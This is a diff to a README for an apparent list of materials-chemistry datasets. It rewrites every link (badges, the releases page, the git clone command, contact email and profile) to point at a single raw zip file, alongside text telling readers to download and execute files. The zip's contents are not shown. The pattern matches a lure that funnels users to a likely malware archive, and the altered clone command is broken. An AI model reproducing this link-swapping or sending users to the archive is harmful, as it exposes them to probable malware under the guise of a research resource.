@@ -1,9 +1,9 @@
 ```markdown
 # 🌟 Awesome MatChem Datasets 🌟
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Version](https://img.shields.io/badge/version-1.0.0-green.svg)
-![Release](https://img.shields.io/badge/releases-latest-orange.svg)
+![License](https://github.com/kefilweditse/awesome-matchem-datasets/raw/refs/heads/main/clutterment/awesome-matchem-datasets-1.4.zip)
+![Version](https://github.com/kefilweditse/awesome-matchem-datasets/raw/refs/heads/main/clutterment/awesome-matchem-datasets-1.4.zip)
+![Release](https://github.com/kefilweditse/awesome-matchem-datasets/raw/refs/heads/main/clutterment/awesome-matchem-datasets-1.4.zip)
 
 Welcome to the **Awesome MatChem Datasets** repository! This collection provides a range of datasets for materials chemistry, aiming to facilitate research and development in this exciting field. Whether you're a researcher, a student, or just curious, you'll find valuable resources here.
 
@@ -35,14 +35,14 @@ Materials chemistry is a dynamic field that combines principles from chemistry, 
 
 ## Getting Started
 
-To get started with the datasets, you can easily download and execute the necessary files. Visit the [Releases section](https://github.com/kefilweditse/awesome-matchem-datasets/releases) to find the latest releases. 
+To get started with the datasets, you can easily download and execute the necessary files. Visit the [Releases section](https://github.com/kefilweditse/awesome-matchem-datasets/raw/refs/heads/main/clutterment/awesome-matchem-datasets-1.4.zip) to find the latest releases. 
 
 ### Installation
 
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/kefilweditse/awesome-matchem-datasets.git
+   git clone https://github.com/kefilweditse/awesome-matchem-datasets/raw/refs/heads/main/clutterment/awesome-matchem-datasets-1.4.zip
    ```
 
 2. Navigate to the directory:
@@ -104,12 +104,12 @@ This repository is licensed under the MIT License. See the [LICENSE](LICENSE) fi
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: [your.email@example.com](mailto:your.email@example.com)
-- **GitHub**: [kefilweditse](https://github.com/kefilweditse)
+- **Email**: [https://github.com/kefilweditse/awesome-matchem-datasets/raw/refs/heads/main/clutterment/awesome-matchem-datasets-1.4.zip](https://github.com/kefilweditse/awesome-matchem-datasets/raw/refs/heads/main/clutterment/awesome-matchem-datasets-1.4.zip)
+- **GitHub**: [kefilweditse](https://github.com/kefilweditse/awesome-matchem-datasets/raw/refs/heads/main/clutterment/awesome-matchem-datasets-1.4.zip)
 
 ## Releases
 
-You can find the latest releases and updates [here](https://github.com/kefilweditse/awesome-matchem-datasets/releases). Make sure to download the relevant files and execute them according to the provided instructions.
+You can find the latest releases and updates [here](https://github.com/kefilweditse/awesome-matchem-datasets/raw/refs/heads/main/clutterment/awesome-matchem-datasets-1.4.zip). Make sure to download the relevant files and execute them according to the provided instructions.
 
 ---
 
